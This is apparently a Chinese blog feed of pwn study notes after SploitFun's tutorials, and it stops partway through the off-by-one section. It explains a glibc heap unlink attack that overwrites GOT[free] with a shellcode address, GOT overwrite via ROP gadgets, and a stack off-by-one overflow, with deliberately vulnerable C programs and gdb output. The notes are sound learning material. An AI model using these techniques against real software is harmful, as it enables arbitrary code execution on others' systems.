<h2 id="Chunk-和-bin-list"><a href="#Chunk-和-bin-list" class="headerlink" title="Chunk 和 bin list"></a>Chunk 和 bin list</h2><p>bin list相当于只是存着指针(或者双向指针)的一个数组,数组中每一项都通过指针把可用的chunk串起来,所以只是表,表,表,那我如何得到bin list的地址呢</p>
<p>chunk是实实际际上可用的内存块,heap区的, 所以地址可能是<code>0x080xxxxx</code>,malloc的返回值就是某一块chunk的user data的首地址,不包括chunck头部的哦</p>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>来自原作者blog</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token comment" spellcheck="true">/* 
 Heap overflow vulnerable program. 
 */</span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span> <span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>
<span class="token punctuation">{</span>
        <span class="token keyword">char</span> <span class="token operator">*</span> first<span class="token punctuation">,</span> <span class="token operator">*</span> second<span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">/*[1]*/</span> first <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span> <span class="token number">666</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">/*[2]*/</span> second <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span> <span class="token number">12</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>argc<span class="token operator">!=</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">/*[3]*/</span>         <span class="token function">strcpy</span><span class="token punctuation">(</span> first<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">/*[4]*/</span> <span class="token function">free</span><span class="token punctuation">(</span> first <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">/*[5]*/</span> <span class="token function">free</span><span class="token punctuation">(</span> second <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">/*[6]*/</span> <span class="token keyword">return</span><span class="token punctuation">(</span> <span class="token number">0</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们执行过[1], [2]两句,看一下</p>
<pre class="line-numbers language-c"><code class="language-c">gdb<span class="token operator">-</span>peda$ p first
$<span class="token number">2</span> <span class="token operator">=</span> <span class="token number">0x804b008</span> <span class="token string">""</span>
gdb<span class="token operator">-</span>peda$ p second
$<span class="token number">3</span> <span class="token operator">=</span> <span class="token number">0x804b2a8</span> <span class="token string">""</span>

gdb<span class="token operator">-</span>peda$ x<span class="token operator">/</span>20x <span class="token number">0x804b2a8</span> <span class="token operator">-</span> <span class="token number">0x08</span>
<span class="token number">0x804b2a0</span><span class="token punctuation">:</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000011</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000000</span>
<span class="token number">0x804b2b0</span><span class="token punctuation">:</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00020d51</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000000</span>
<span class="token number">0x804b2c0</span><span class="token punctuation">:</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000000</span>
<span class="token number">0x804b2d0</span><span class="token punctuation">:</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000000</span>
<span class="token number">0x804b2e0</span><span class="token punctuation">:</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000000</span>
gdb<span class="token operator">-</span>peda$ x<span class="token operator">/</span>20x <span class="token number">0x804b008</span> <span class="token operator">-</span> <span class="token number">0x08</span>
<span class="token number">0x804b000</span><span class="token punctuation">:</span>    <span class="token number">0x00000000</span>    <span class="token number">0x000002a1</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000000</span>
<span class="token number">0x804b010</span><span class="token punctuation">:</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000000</span>
<span class="token number">0x804b020</span><span class="token punctuation">:</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000000</span>
<span class="token number">0x804b030</span><span class="token punctuation">:</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000000</span>
<span class="token number">0x804b040</span><span class="token punctuation">:</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000000</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们<code>-0x08</code>是为了看到他chunk的头部</p>
<pre><code>+-------------+
Top chunk
+-------------+
size=0x20d51
+-------------+ 
previous size
+-------------+ 
second chunk
+-------------+ 0x804b2a8 ------+
size=0x11                       |
+-------------+ 0x804b2a4       |
previous size                   |=&gt; 0x2a0个字节
+-------------+ 0x804b2a0       |
First chunck                    |
+-------------+ 0x804b008 ------+
size=0x2a1
+-------------+ 0x804b004
previous size
+-------------+ 0x804b000
</code></pre><p>first chunk在malloc的时候给的参数是666,这里first chunk的size是<br>0x2a1 = 673  为什么是这样子???<br>智障了吧,最后三位是0 or 1不代表大小<br>后三位是没有意义的,他会8字节对齐,最后三位用于标志位<br>0x2a1 = 0000 0010 1010 0<code>001</code><br>所以这里代表的大小是 666 对于 8 向上对齐,就是 672 / 8 = 84<br>所以First Chunk是从 0x804b200 ~ 0x804b2a8 这672字节</p>
<p>这样子的话是不是说Heap最低地址一般都是 0x804x000<br>然后<code>size + previous size</code> 是 8字节<br>这样子正好chunk的User data开始的地址也是对齐的<br>是这个意思吗</p>
<p>同理,second chunk大小是12也不能对齐8,所以对齐到了16(0x10),又由于second的前一块,即first chunk也被allocate出去了,所以标志位最后一位是1,所以,内存中second chunk的大小是0x11 = 0000 0000 0001 0<code>001</code></p>
<p>不过有点不太对劲啊,难道…这0x2a0个字节只是说了这一块User data到下一块User data之间的距离,已经把人家下一块的<code>size + previous</code>也算进去了???</p>
<p>也就是说计算的时候,对应的项差size个字节是这个意思吗???<br>就是<br>chunk[1].size == chunk[2].data_offset - chunk[1].data_offset<br>chunk[1].size == chunk[2].size_offset - chunk[1].size_offset<br>…</p>
<p>那我们验证一下,second chunk的size在0x804b2a4,大小为0x10,那0x804b2b4 = 0x804b2a4 + 0x10存的应该是op chunk的大小</p>
<p>喔,,,果然是这样子</p>
<pre class="line-numbers language-c"><code class="language-c">gdb<span class="token operator">-</span>peda$ x <span class="token number">0x804b004</span>
<span class="token number">0x804b004</span><span class="token punctuation">:</span>    <span class="token number">0x000002a1</span>   <span class="token comment" spellcheck="true">// first chunk'size</span>
gdb<span class="token operator">-</span>peda$ x <span class="token number">0x804b004</span> <span class="token operator">+</span> <span class="token number">0x000002a0</span>
<span class="token number">0x804b2a4</span><span class="token punctuation">:</span>    <span class="token number">0x00000011</span>  <span class="token comment" spellcheck="true">// second chunk'size</span>
gdb<span class="token operator">-</span>peda$ x <span class="token number">0x804b2a4</span> <span class="token operator">+</span> <span class="token number">0x00000010</span>
<span class="token number">0x804b2b4</span><span class="token punctuation">:</span>    <span class="token number">0x00020d51</span>  <span class="token comment" spellcheck="true">// Top chunk'size</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>所以在[4], free掉Fisrt chunk的时候<br>检查前一块是否使用<br>通过自己的size = 0x2a1, 最后一位是1, 所以前一块不空闲(这里first chunk是第一块,他其实是没有前一块,但应该为了统一,假设第一块前面那一块不存在的块是在使用的块,就不能合并了)</p>
<p>检查后一块是否使用<br>检查后一块就是检查second块,可以通过second的下一块即Top chunk的size字段最后一位,即0x00020d51的最后一位标志的top的前一块也就是second正在使用,所以不能合并</p>
<p>这里都不是空闲的,如果是空闲的话,就会触发binlist的unlink操作,就是把被合并的块从binlist里卸下来</p>
<p>而如果我们在[3]里的strcpy的时候,进行了奇怪的操作,就是不光写了first chunk的data部分,还写了second chunk的头部</p>
<pre class="line-numbers language-c"><code class="language-c">prev_size <span class="token operator">=</span> even number and hence PREV_INUSE bit is unset<span class="token punctuation">.</span>
size <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">4</span>
fd <span class="token operator">=</span> free address – <span class="token number">12</span>
bk <span class="token operator">=</span> shellcode address
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>那么在[4], free掉First chunk的时候,<br>检查前一块是否使用<br>通过自己的size = 0x2a1, 最后一位是1, 所以前一块不空闲</p>
<p>检查后一块是否使用<br>检查后一块就是检查second块,可以通过second的下一块的size字段来看,上面刚说到这个下一块的size字段,其实就是用second的size字段的位置加上second的size字段,放在这里就是,往回数4个字节,正好到了sedond chunk的previous size这里,而这里被我们改写成了偶数,这个时候malloc就会认为我们的second是free的,就会把他从bin list上取下来,准备合并</p>
<pre><code>+-------------+ 高地址
Top chunk
+-------------+
size=0x20d51
+-------------+ 
previous size
+-------------+ 
second chunk
bk -------------&gt; addr_free - 12
fd -------------&gt; addr_shellcode
+-------------+ 
size= -4
+-------------+ &lt;--- size_of_second
previous size =&gt;&gt;&gt;&gt; 覆盖成偶数
+-------------+ &lt;--addr_size_of_second + size_of_second
</code></pre><p>在unlink掉second时候,会将second的fd和bk字段赋值给FD和BK变量,还有,还有看代码吧</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> unlink(P, BK, FD) {                                            \
    FD = P->fd;                                      \
    BK = P->bk;                                      \
    FD->bk = BK;                                  \
    BK->fd = FD;                                  \
    ...</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在我们这里是</p>
<pre class="line-numbers language-c"><code class="language-c">FD <span class="token operator">=</span> addr_free <span class="token operator">-</span> <span class="token number">12</span><span class="token punctuation">;</span>
BK <span class="token operator">=</span> addr_shellcode<span class="token punctuation">;</span> 
FD <span class="token operator">-></span> bk <span class="token operator">=</span> addr_shellcode<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//GOT[free] = addr_shellcode, 到此就完成了GOT overwrite</span>
BK <span class="token operator">-></span> fd <span class="token operator">=</span> FD<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// (shellcode + 8) = addr_free - 12</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里的addr_free就是GOT[free],我们的FD是addr_GOT[free]-12,对吧,这里的12怎么来的就是看第三句,我们要<code>FD -&gt; bk</code>, 我们看下,对于一个块,他的bk指针是偏移12字节的,前面有<code>prev_size</code>, <code>size</code>和<code>fd</code></p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">struct</span> <span class="token punctuation">{</span>
dword prev_size<span class="token punctuation">;</span>
dword size<span class="token punctuation">;</span>
bin <span class="token operator">*</span> fd<span class="token punctuation">;</span>
bin <span class="token operator">*</span> bk<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>结论:这链表链着的是块头部,从prev_size开始的<br>炒鸡注意:这里第四句会把shellcode的第8-11这四个字节给破坏掉</p>
</blockquote>
<p>这里就是整个比较老的glibc的攻击思路</p>
<p>前面的我们搞清楚了</p>
<p>但.新的glibc加了一些防护功能<br>见wooyun这一篇 <a href="http://www.tuicool.com/articles/E3Ezu2u" target="_blank" rel="external">http://www.tuicool.com/articles/E3Ezu2u</a></p>
]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[GOT overwitre & GOT dereference]]></title>
      <url>/2017/07/24/GOT-overwitre-GOT-dereference/</url>
      <content type="html"><![CDATA[<p>还是来自<code>sploitfun</code>的blog,绕过地址随机化之三</p>
<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><h3 id="GOT-overwitre"><a href="#GOT-overwitre" class="headerlink" title="GOT overwitre"></a>GOT overwitre</h3><p>其实就是我们常说的GOT表覆写,这个got表的地址是早已经确定的,但got表的内容</p>
<pre class="line-numbers language-python"><code class="language-python">offset_diff <span class="token operator">=</span> execve_addr <span class="token operator">-</span> getuid_addr
GOT<span class="token punctuation">[</span>getuid<span class="token punctuation">]</span> <span class="token operator">=</span> GOT<span class="token punctuation">[</span>getuid<span class="token punctuation">]</span> <span class="token operator">+</span> offset_diff
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>其实<code>ret2dl-resolve</code>是不是有类似的地方</p>
<h3 id="GOT-dereference"><a href="#GOT-dereference" class="headerlink" title="GOT dereference"></a>GOT dereference</h3><p>这个没有使用过</p>
<pre class="line-numbers language-python"><code class="language-python">offset_diff <span class="token operator">=</span> execve_addr <span class="token operator">-</span> getuid_addr
eax <span class="token operator">=</span> GOT<span class="token punctuation">[</span>getuid<span class="token punctuation">]</span>
eax <span class="token operator">=</span> eax <span class="token operator">+</span> offset_diff
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>是用ROP咯</p>
<h3 id="GOT-overwitre-1"><a href="#GOT-overwitre-1" class="headerlink" title="GOT overwitre"></a>GOT overwitre</h3><p>作者找到了几个gadget</p>
<pre class="line-numbers language-asm"><code class="language-asm"># gadget1
add eax, [ebx + 0x5d5b04c4]
ret
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>这样子让<code>$eax = offset</code>并且<code>$ebx = got[uid] -0x5d5b04c4</code>就阔以啦</p>
<pre class="line-numbers language-asm"><code class="language-asm"># gadget2
pop ebx
ret
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>我们先把所要的值搞到栈里,然后调到这里来完成给ebx的赋值</p>
<pre class="line-numbers language-asm"><code class="language-asm"># gadget3
pop eax
ret
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>emmmmm~,这样子就阔以了,然后作者说找不到这个gadget3</p>
<h3 id="GOT-dereference-1"><a href="#GOT-dereference-1" class="headerlink" title="GOT dereference"></a>GOT dereference</h3><h2 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h2><p>原文中提到了<code>stack pivot</code>,利用<code>leave</code>来实现,因为<code>leave</code>其实相当于可以控制<code>esp</code>,所以相当于可以自定义栈地址<br>所以只需要改掉<code>ebp</code>,然后跳到<code>leave; ret</code></p>
]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SploitFun off-by-one]]></title>
      <url>/2017/07/24/SploitFun-off-by-one/</url>
      <content type="html"><![CDATA[<p>跟着<code>SploitFun</code>大佬的blog学习pwn<br>第一节是普通的栈溢出,第二节是整数溢出</p>
<p>现在看的是第三节<code>off-by-one</code></p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><code>off-by-one</code>,one是一个字节,就是一个字节的溢出<br>比如</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">char</span> vuln_s<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        vuln_s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>缓冲区只有5个字节的大小,我们却赋值了六次,这个第六次就看会覆盖到缓冲区上面的位置,通常是<code>ebp</code>的最低字节</p>
<h2 id="代码及分析"><a href="#代码及分析" class="headerlink" title="代码及分析"></a>代码及分析</h2><p>大佬的blog讲的是最基础的栈上的off-by-one的一个例子,网上还有大佬写过一个堆上off-by-one的<a href="http://bobao.360.cn/learning/detail/3113.html" target="_blank" rel="external">文章</a></p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token comment" spellcheck="true">//vuln.c</span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token keyword">void</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> arg<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">void</span> <span class="token function">bar</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> arg<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">void</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> arg<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">bar</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* [1] */</span>
<span class="token punctuation">}</span>
<span class="token keyword">void</span> <span class="token function">bar</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> arg<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> arg<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* [2] */</span>
<span class="token punctuation">}</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">256</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">/* [3] */</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Attempted Buffer Overflow\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">foo</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* [4] */</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment" spellcheck="true">// compilation </span>
gcc <span class="token operator">-</span>fno<span class="token operator">-</span>stack<span class="token operator">-</span>protector <span class="token operator">-</span>z execstack <span class="token operator">-</span>mpreferred<span class="token operator">-</span>stack<span class="token operator">-</span>boundary<span class="token operator">=</span><span class="token number">2</span> <span class="token operator">-</span>o vuln vuln<span class="token punctuation">.</span>c
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>注意这里的对齐参数,默认是等于4,对齐到2^4=16字节的,我们调整为4字节<br>内存对齐具体可以参考下<a href="http://blog.csdn.net/yayong/article/details/170842" target="_blank" rel="external">这一个</a></p>
</blockquote>
<p>这里造成溢出的是bar函数中的<code>strcpy</code>, 这里的缓冲区<code>buf</code>有256字节,在main函数里面判断是<code>strlen(argv[1])&gt;256</code>,字符串最大可以是256字节,看起来好像是刚刚好.但其实并不是这样子<br>我们找到strcpy的介绍</p>
<blockquote>
<p>Copies the C string pointed by source into the array pointed by destination, including the terminating null character</p>
</blockquote>
<p>strcpy会把第257个字节的<code>\0</code>也写到目的缓冲区,这个时候就会到<code>buf</code>再靠上的一个字节,在这里,可能会把bar函数存的ebp的低位字节变成<code>\0</code>,我们来试一试</p>
<p>我们在<code>main</code>这里打个断点,然后<code>输入256个A</code>,进入调试,一路下一步走到bar函数里<br>这个时候,我们的<code>$ebp = 0xffffcaec</code>,然后其实,这个<code>ebp</code>是caller的ebp,这里push一下,等会还要给人家pop回去,这里也能想象,虽然覆盖发生在<code>bar函数</code>,但最后出问题却不在bar函数,是等<code>bar</code>函数要ret回去到<code>foo</code>的时候,才会把错误的ebp给pop出来</p>
<pre class="line-numbers language-c"><code class="language-c">gdb<span class="token operator">-</span>peda$ r `python <span class="token operator">-</span>c <span class="token string">'print "A"*256'</span>`

<span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>code<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token punctuation">]</span>
<span class="token operator">=</span><span class="token operator">></span> <span class="token number">0x80484dc</span> <span class="token operator">&lt;</span>bar<span class="token operator">></span><span class="token punctuation">:</span>    push   ebp
   <span class="token number">0x80484dd</span> <span class="token operator">&lt;</span>bar<span class="token operator">+</span><span class="token number">1</span><span class="token operator">></span><span class="token punctuation">:</span>    mov    ebp<span class="token punctuation">,</span>esp
   <span class="token number">0x80484df</span> <span class="token operator">&lt;</span>bar<span class="token operator">+</span><span class="token number">3</span><span class="token operator">></span><span class="token punctuation">:</span>    sub    esp<span class="token punctuation">,</span><span class="token number">0x100</span>
   <span class="token number">0x80484e5</span> <span class="token operator">&lt;</span>bar<span class="token operator">+</span><span class="token number">9</span><span class="token operator">></span><span class="token punctuation">:</span>    push   DWORD PTR <span class="token punctuation">[</span>ebp<span class="token operator">+</span><span class="token number">0x8</span><span class="token punctuation">]</span>
   <span class="token number">0x80484e8</span> <span class="token operator">&lt;</span>bar<span class="token operator">+</span><span class="token number">12</span><span class="token operator">></span><span class="token punctuation">:</span>    lea    eax<span class="token punctuation">,</span><span class="token punctuation">[</span>ebp<span class="token number">-0x100</span><span class="token punctuation">]</span>
   <span class="token number">0x80484ee</span> <span class="token operator">&lt;</span>bar<span class="token operator">+</span><span class="token number">18</span><span class="token operator">></span><span class="token punctuation">:</span>    push   eax
   <span class="token number">0x80484ef</span> <span class="token operator">&lt;</span>bar<span class="token operator">+</span><span class="token number">19</span><span class="token operator">></span><span class="token punctuation">:</span>    call   <span class="token number">0x8048380</span> <span class="token operator">&lt;</span>strcpy@plt<span class="token operator">></span>
   <span class="token number">0x80484f4</span> <span class="token operator">&lt;</span>bar<span class="token operator">+</span><span class="token number">24</span><span class="token operator">></span><span class="token punctuation">:</span>    add    esp<span class="token punctuation">,</span><span class="token number">0x8</span>
   <span class="token number">0x80484f7</span> <span class="token operator">&lt;</span>bar<span class="token operator">+</span><span class="token number">27</span><span class="token operator">></span><span class="token punctuation">:</span>    nop
   <span class="token number">0x80484f8</span> <span class="token operator">&lt;</span>bar<span class="token operator">+</span><span class="token number">28</span><span class="token operator">></span><span class="token punctuation">:</span>    leave  
   <span class="token number">0x80484f9</span> <span class="token operator">&lt;</span>bar<span class="token operator">+</span><span class="token number">29</span><span class="token operator">></span><span class="token punctuation">:</span>    ret
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>执行过strcpy之后我们的EBP存的值以及变化了</p>
<pre class="line-numbers language-c"><code class="language-c">原来
EBP<span class="token punctuation">:</span> <span class="token number">0xffffcae0</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0xffffcaec</span>
现在可以看到后最后一个字节果然变成了<span class="token number">0x00</span>
EBP<span class="token punctuation">:</span> <span class="token number">0xffffcae0</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0xffffca00</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>执行到<code>leave</code>,前面说过<code>leave</code>是相当于</p>
<pre class="line-numbers language-c"><code class="language-c">mov esp<span class="token punctuation">,</span> ebp
pop ebp
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>这个时候,先是我们的<code>mov esp, ebp</code><br><code>$esp = 0xffffcae0 --&gt; 0xffffca00</code><br>然后<code>pop ebp</code><br><code>$ebp = 0xffffca00</code></p>
<p>之后ret回到foo的时候,我们的ebp就不对了,不对了有什么影响呢,我们看看返回到了foo</p>
<pre class="line-numbers language-c"><code class="language-c">   <span class="token number">0x80484cb</span> <span class="token operator">&lt;</span>foo<span class="token operator">></span><span class="token punctuation">:</span>    push   ebp
   <span class="token number">0x80484cc</span> <span class="token operator">&lt;</span>foo<span class="token operator">+</span><span class="token number">1</span><span class="token operator">></span><span class="token punctuation">:</span>    mov    ebp<span class="token punctuation">,</span>esp
   <span class="token number">0x80484ce</span> <span class="token operator">&lt;</span>foo<span class="token operator">+</span><span class="token number">3</span><span class="token operator">></span><span class="token punctuation">:</span>    push   DWORD PTR <span class="token punctuation">[</span>ebp<span class="token operator">+</span><span class="token number">0x8</span><span class="token punctuation">]</span>
   <span class="token number">0x80484d1</span> <span class="token operator">&lt;</span>foo<span class="token operator">+</span><span class="token number">6</span><span class="token operator">></span><span class="token punctuation">:</span>    call   <span class="token number">0x80484dc</span> <span class="token operator">&lt;</span>bar<span class="token operator">></span>
<span class="token operator">=</span><span class="token operator">></span> <span class="token number">0x80484d6</span> <span class="token operator">&lt;</span>foo<span class="token operator">+</span><span class="token number">11</span><span class="token operator">></span><span class="token punctuation">:</span>    add    esp<span class="token punctuation">,</span><span class="token number">0x4</span>
   <span class="token number">0x80484d9</span> <span class="token operator">&lt;</span>foo<span class="token operator">+</span><span class="token number">14</span><span class="token operator">></span><span class="token punctuation">:</span>    nop
   <span class="token number">0x80484da</span> <span class="token operator">&lt;</span>foo<span class="token operator">+</span><span class="token number">15</span><span class="token operator">></span><span class="token punctuation">:</span>    leave  
   <span class="token number">0x80484db</span> <span class="token operator">&lt;</span>foo<span class="token operator">+</span><span class="token number">16</span><span class="token operator">></span><span class="token punctuation">:</span>    ret
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>看到这里的leave了咩,这里会把我们错误的ebp给esp,相当于我控制了esp,好吧,我控制的不太好,只能改变他的末字节…先不说这个,我们相当不稳的控制了esp,会让下面ret到奇怪的地方对不对,对吧,因为ret实际就是<code>pop</code>出来一个返回地址,然后跳过去,从哪里pop,就是从栈顶esp这里啊</p>
<p>这个时候思路很清楚了就是要把这里要pop出来的返回地址改成我们想要的<br>因为整个过程我们相当于通过<code>strcpy</code>把<code>foo</code>的ebp低字节改掉了,导致在第二次leave的时候,改掉了栈顶esp,因为是最后一个字节变小了,这个改变在2^8=256字节之内,而且是变小</p>
<p>啊,还有,某个四字节变量比如<code>*0xffff7840</code>,他的值存在<code>0xffff7840-0xffff7843</code>,你取值给的是最低字节地址,像下图,我们正常指向的话,我上面那个箭头指的变量是<code>ret2main</code>,而不是<code>main_ebp</code></p>
<p>正常情况下要ret的时候是这样子</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span> 高地址
ret2main
